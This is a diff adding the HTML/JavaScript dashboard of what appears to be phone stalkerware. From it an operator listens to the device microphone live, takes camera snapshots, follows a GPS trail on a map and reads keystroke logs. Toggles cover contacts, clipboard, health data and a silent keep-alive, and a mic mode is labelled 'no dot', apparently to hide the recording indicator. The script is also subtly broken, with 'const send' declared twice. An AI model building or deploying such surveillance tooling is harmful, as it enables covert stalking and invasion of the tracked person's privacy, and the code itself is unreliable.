@@ -1,0 +1,205 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0f14">
+<title>Monitor</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
+<style>
+  :root { color-scheme: dark; }
+  body { margin:0; background:#0b0f14; color:#e5e7eb; font:15px -apple-system,system-ui,Roboto,sans-serif; padding:14px; }
+  button, select { font-family:inherit; }
+  #map { height:200px; border-radius:12px; margin:12px 0; }
+  #photo { width:100%; border-radius:12px; display:block; background:#131a22; min-height:110px; }
+  #log { font:12px ui-monospace,monospace; background:#131a22; border-radius:12px; padding:10px;
+         max-height:160px; overflow:auto; white-space:pre-wrap; color:#9ca3af; }
+  #toggles { display:grid; grid-template-columns:1fr 1fr; gap:5px; font-size:11.5px; }
+  #toggles label { display:flex; gap:6px; align-items:center; padding:6px; background:#131a22; border-radius:8px; }
+  .card { background:#131a22; border-radius:12px; padding:12px; margin:12px 0; }
+</style>
+</head>
+<body>
+
+<button id="unlock" style="width:100%;padding:15px;border:0;border-radius:12px;background:#2563eb;color:#fff;font-size:15px;font-weight:600;">Tap to listen</button>
+
+<div style="display:flex;gap:8px;margin:12px 0;">
+  <button id="listen" style="flex:2;padding:14px;border-radius:10px;border:0;background:#2563eb;color:#fff;font-weight:600;">Listen</button>
+  <button id="hold" style="flex:1;padding:14px;border-radius:10px;border:1px solid #1f2937;background:#131a22;color:#e5e7eb;">Hold</button>
+</div>
+
+<div id="livebar" style="display:none;align-items:center;gap:10px;background:#131a22;border-radius:10px;padding:10px;margin:10px 0;">
+  <span style="width:8px;height:8px;border-radius:50%;background:#ef4444;"></span>
+  <b style="font-size:12px;">LIVE</b>
+  <div style="flex:1;height:6px;background:#0b0f14;border-radius:3px;overflow:hidden;">
+    <div id="lvl" style="height:100%;width:0;background:#16a34a;"></div>
+  </div>
+  <span id="timer" style="font:12px ui-monospace,monospace;color:#9ca3af;">00:00</span>
+</div>
+
+<select id="micMode" style="width:100%;padding:10px;border-radius:10px;background:#131a22;color:#e5e7eb;border:1px solid #1f2937;">
+  <option value="onDemand">Mic: on demand (no dot)</option>
+  <option value="voiceTrigger">Mic: voice trigger</option>
+  <option value="burst">Mic: burst</option>
+  <option value="always">Mic: always</option>
+</select>
+
+<div id="map"></div>
+<img id="photo" alt="snapshot">
+
+<div style="display:flex;gap:8px;margin:12px 0;">
+  <button id="snap" style="flex:1;padding:12px;border-radius:10px;border:1px solid #1f2937;background:#131a22;color:#e5e7eb;">Snap</button>
+  <button id="flip" style="flex:1;padding:12px;border-radius:10px;border:1px solid #1f2937;background:#131a22;color:#e5e7eb;">Flip cam</button>
+</div>
+
+<div class="card"><b>Alerts</b><div id="alerts" style="font:12px ui-monospace,monospace;max-height:180px;overflow:auto;margin-top:8px;color:#9ca3af;"></div></div>
+<div class="card"><b>Clips</b><div id="clips" style="display:grid;gap:6px;margin-top:8px;"></div></div>
+<div class="card"><b>Features</b><div id="toggles" style="margin-top:8px;"></div></div>
+<div class="card"><b>Keylog</b><div id="log" style="margin-top:8px;"></div></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<script>
+const token = (window.Android ? Android.token() : '') || '';
+const ws = { readyState: 1, send: function (s) { Android.send(s); } };
+const send = function (o) { if (ws.readyState === 1) Android.send(JSON.stringify(o)); };
+function __bin(b64) {
+  const bin = atob(b64);
+  const buf = new ArrayBuffer(bin.length);
+  const v = new Uint8Array(buf);
+  for (let i = 0; i < bin.length; i++) v[i] = bin.charCodeAt(i);
+  if (ws.onmessage) ws.onmessage({ data: buf });
+}
+const send = (o) => { if (ws.readyState === 1) ws.send(JSON.stringify(o)); };
+
+const KEYS = ['mic','camera','location','preciseLocation','keylog','voiceActivity','clipCapture',
+  'liveStream','photoLibrary','contacts','calendar','reminders','clipboard','motion','batteryState',
+  'health','wifiInfo','geofence','screenTime','silentKeepAlive','schedule','storeAndForward',
+  'history','pushAlerts','keywordTriggers','encryption','watchdog','blankSnapshot'];
+
+const toggles = document.getElementById('toggles');
+KEYS.forEach(function (k) {
+  const l = document.createElement('label');
+  l.innerHTML = '<input type="checkbox" data-k="' + k + '"><span>' + k + '</span>';
+  l.querySelector('input').onchange = function (e) {
+    const vals = {}; vals[k] = e.target.checked;
+    send({ type: 'settings', values: vals });
+  };
+  toggles.appendChild(l);
+});
+
+function addAlert(t) {
+  const d = document.createElement('div');
+  d.textContent = new Date().toLocaleTimeString() + '  ' + t;
+  document.getElementById('alerts').prepend(d);
+}
+function addClip(c) {
+  if (document.getElementById('c_' + c.name)) return;
+  const row = document.createElement('div');
+  row.id = 'c_' + c.name;
+  row.innerHTML = '<div style="font-size:11.5px;color:#9ca3af;margin-bottom:4px;">' +
+    new Date(c.at).toLocaleTimeString() + ' - ' + Number(c.seconds).toFixed(0) + 's - ' + c.session + '</div>' +
+    '<audio controls preload="none" style="width:100%;height:32px" src="/clips/' + c.name + '"></audio>';
+  document.getElementById('clips').prepend(row);
+}
+
+const map = L.map('map', { zoomControl: false, attributionControl: false }).setView([0, 0], 2);
+L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png?key=cb1_2nve_1_afe1da6ca18e958f7724fb54').addTo(map);
+let trail = [], dot = null, first = true, poly = null;
+
+let ac = null, rate = 16000, playhead = 0;
+const JITTER = 0.2;
+
+document.getElementById('unlock').onclick = async function () {
+  ac = new AudioContext({ sampleRate: rate });
+  await ac.resume();
+  playhead = ac.currentTime + JITTER;
+  this.textContent = 'Listening';
+  this.style.background = '#16a34a';
+  try { await navigator.wakeLock.request('screen'); } catch (e) {}
+};
+
+function playPCM(int16) {
+  if (!ac) return;
+  const f = new Float32Array(int16.length);
+  for (let i = 0; i < int16.length; i++) f[i] = int16[i] / 32768;
+  const buf = ac.createBuffer(1, f.length, rate);
+  buf.copyToChannel(f, 0);
+  const src = ac.createBufferSource();
+  src.buffer = buf; src.connect(ac.destination);
+  const now = ac.currentTime;
+  if (playhead < now + 0.02) playhead = now + JITTER;
+  src.start(playhead);
+  playhead += buf.duration;
+}
+
+let holding = false, t0 = null, tick = null;
+
+document.getElementById('listen').onclick = function () {
+  send({ type: 'cmd', cmd: holding ? 'stopListen' : 'listen', seconds: 300 });
+};
+document.getElementById('hold').onclick = function () {
+  holding = !holding;
+  this.textContent = holding ? 'Hold ON' : 'Hold';
+  send({ type: 'cmd', cmd: holding ? 'listen' : 'stopListen', seconds: -1 });
+};
+document.getElementById('snap').onclick = function () { send({ type: 'cmd', cmd: 'snap' }); };
+document.getElementById('flip').onclick = function () { send({ type: 'cmd', cmd: 'front' }); };
+document.getElementById('micMode').onchange = function (e) { send({ type: 'settings', micMode: e.target.value }); };
+
+ws.onmessage = function (e) {
+  if (typeof e.data !== 'string') { playPCM(new Int16Array(e.data)); return; }
+  const m = JSON.parse(e.data);
+  if (m.type === 'audio-format') rate = m.rate;
+  if (m.type === 'photo') document.getElementById('photo').src = 'data:image/jpeg;base64,' + m.b64;
+  if (m.type === 'keys') document.getElementById('log').textContent = m.lines.join('\n');
+  if (m.type === 'clip') addClip(m);
+  if (m.type === 'alert') addAlert((m.title || '') + ' - ' + (m.reason || ''));
+  if (m.type === 'vad' && m.state === 'start') addAlert('voice detected');
+  if (m.type === 'vad' && m.state === 'end' && ac) playhead = Math.max(playhead, ac.currentTime + 0.05);
+  if (m.type === 'settings') {
+    document.querySelectorAll('#toggles input').forEach(function (i) {
+      if (m.values && m.values[i.dataset.k] !== undefined) i.checked = m.values[i.dataset.k];
+    });
+    if (m.micMode) document.getElementById('micMode').value = m.micMode;
+  }
+  if (m.type === 'mic') {
+    document.getElementById('livebar').style.display = m.on ? 'flex' : 'none';
+    const lb = document.getElementById('listen');
+    lb.textContent = m.on ? 'Listening...' : 'Listen';
+    lb.style.background = m.on ? '#16a34a' : '#2563eb';
+    clearInterval(tick);
+    if (m.on) {
+      t0 = Date.now();
+      tick = setInterval(function () {
+        const s = Math.floor((Date.now() - t0) / 1000);
+        document.getElementById('timer').textContent =
+          String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
+      }, 1000);
+    }
+    if (!m.on && m.summary) addAlert('session ended - ' + m.summary);
+  }
+  if (m.type === 'gps') {
+    const p = [m.lat, m.lon];
+    trail.push(p);
+    if (first) { map.setView(p, 16); first = false; } else { map.panTo(p); }
+    if (dot) { dot.setLatLng(p); } else {
+      dot = L.circleMarker(p, { radius: 7, color: '#4ade80', fillColor: '#4ade80', fillOpacity: 1, weight: 2 }).addTo(map);
+    }
+    if (trail.length > 1) {
+      if (poly) { poly.setLatLngs(trail); } else { poly = L.polyline(trail, { color: '#3b82f6', weight: 3 }).addTo(map); }
+    }
+  }
+  if (m.type === 'snapshot') {
+    if (m.photo) document.getElementById('photo').src = 'data:image/jpeg;base64,' + m.photo;
+    if (m.gps) { map.setView([m.gps.lat, m.gps.lon], 16); first = false; }
+    (m.clips || []).forEach(addClip);
+    (m.alerts || []).forEach(function (a) { addAlert((a.title || '') + ' - ' + (a.reason || '')); });
+    if (m.keys) document.getElementById('log').textContent = m.keys.join('\n');
+  }
+};
+
+ws.onclose = function () { setTimeout(function () { location.reload(); }, 2000); };
+setTimeout(function () { map.invalidateSize(); }, 150);
+</script>
+</body>
+</html>
